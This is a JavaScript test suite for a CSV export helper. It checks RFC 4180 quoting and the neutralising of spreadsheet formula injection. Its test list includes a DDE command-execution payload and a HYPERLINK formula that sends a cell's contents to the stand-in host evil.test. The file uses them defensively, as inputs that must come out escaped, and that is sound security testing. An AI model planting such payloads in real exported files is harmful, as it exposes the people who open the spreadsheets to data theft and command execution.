// Tests commercial/lib/csv.js — RFC 4180 quoting and spreadsheet-formula neutralisation.
//
// SKIPS when commercial/ is absent. The public core is checked out without it, and a suite that
// hard-fails there would make the open-core repo's own CI red for a file it does not contain.
const fs = require('fs');
const path = require('path');
const { assert, done } = require('./test-util');

const csvPath = path.join(__dirname, '..', 'commercial', 'lib', 'csv.js');
if (!fs.existsSync(csvPath)) {
  console.log('ok  : commercial/ not present (Community checkout) — CSV suite skipped');
  done();
  return;
}

const { csvCell, toCsv } = require(csvPath);

// --- correctness first: this breaks on ordinary data, with no attacker anywhere -----------------
assert(csvCell('Acme, Inc.') === '"Acme, Inc."',
  'a value containing a comma is quoted — unquoted, it shifted every column after it and the file still LOOKED fine');
assert(csvCell('He said "hi"') === '"He said ""hi"""', 'embedded quotes are doubled, per RFC 4180');
assert(csvCell('line one\nline two') === '"line one\nline two"', 'newlines are quoted rather than splitting the row');
assert(csvCell('line\r\ntwo') === '"line\r\ntwo"', 'CRLF too');
assert(csvCell('plain') === 'plain', 'a value needing no quoting is left alone');
assert(csvCell('') === '' && csvCell(null) === '' && csvCell(undefined) === '', 'empty and nullish cells are empty, not "null"');
assert(csvCell(0) === '0' && csvCell(false) === 'false', 'falsy non-nullish values survive — 0 is a real measurement');
assert(csvCell({ a: 1 }) === '"{""a"":1}"', 'an object is JSON, not [object Object] — a report cell should not silently lose its data');

// --- formula injection: the consequence lands on whoever OPENS the file --------------------------
// Values reach reports from leads, plugin responses and agent output. The reader is usually a
// client we sent the report to, so an unneutralised cell executes in someone else's spreadsheet.
for (const payload of [
  '=1+1',
  '+1+1',
  '-1+1',
  '@SUM(A1)',
  '=cmd|\' /C calc\'!A0',                        // the classic DDE command-execution payload
  '=HYPERLINK("http://evil.test?d="&A1,"Click")', // the quiet one: exfiltrates a neighbouring cell
  '\t=1+1',                                       // leading tab, to slip past a naive first-char check
  '\r=1+1',
]) {
  const out = csvCell(payload);
  const inner = out.startsWith('"') ? out.slice(1, -1).replace(/""/g, '"') : out;
  assert(inner.startsWith("'"), `"${payload.replace(/[\r\t]/g, '\\t')}" is neutralised with a leading apostrophe`);
  assert(inner.slice(1) === payload, '...and the original value is PRESERVED intact — neutralising must not corrupt the data it protects');
}

// The apostrophe has to end up INSIDE the quotes, or the spreadsheet never sees it and the
// neutralisation is decorative. This is the ordering bug worth pinning.
const both = csvCell('=SUM(A1,B1)');
assert(both.startsWith('"\'') && both.endsWith('"'),
  'a value that is BOTH a formula and needs quoting is neutralised first, quoted second');

// Legitimate values that merely start with a dangerous character must stay readable.
assert(csvCell('-15%').slice(1) === '-15%', 'a negative-looking value keeps its text exactly');

// --- whole documents -----------------------------------------------------------------------------
assert(toCsv([['a', 'b'], ['c', 'd']]) === 'a,b\r\nc,d', 'rows join with CRLF');
assert(toCsv([]) === '' && toCsv(null) === '', 'no rows is an empty document, not a crash');
assert(toCsv([[]]) === '', 'the empty spacer row the report writer emits between sections survives');
assert(toCsv(['--- Section ---']) === "'--- Section ---", 'a bare string row is treated as a single cell');

// Worth stating plainly, because it surprised me writing this: the report writer's own section
// headers are `--- Name ---`, which START WITH A HYPHEN and are therefore neutralised like any
// other formula-leading cell. That is correct rather than incidental — Excel parses a leading `-`
// as arithmetic and renders `---Section---` as #NAME?, so the apostrophe is what makes the header
// display as written. The visible cost is a leading apostrophe in the formula bar; the alternative
// is a broken cell.
assert(toCsv([['--- Costs ---'], ['total', 5]]) === "'--- Costs ---\r\ntotal,5",
  'a section header survives as readable text, and ordinary numbers are untouched');

// The report writer builds rows from Object.values(), so a row is whatever the data held.
const report = toCsv([['name', 'note'], ['Acme, Inc.', '=BAD()'], ['Bob', 'said "ok"']]);
assert(report.split('\r\n').length === 3, 'a report with a comma, a formula and a quote in it still has exactly three rows');
// Not quoted: once neutralised, `'=BAD()` contains no comma, quote or newline, so RFC 4180 does not
// call for quoting and adding it anyway would be noise. Neutralisation and quoting answer different
// questions, and this asserts they stay independent.
assert(report.includes("\r\n\"Acme, Inc.\",'=BAD()\r\n"),
  'the formula in the middle of a real report is neutralised, and its comma-bearing neighbour is quoted, in the same row');

done();
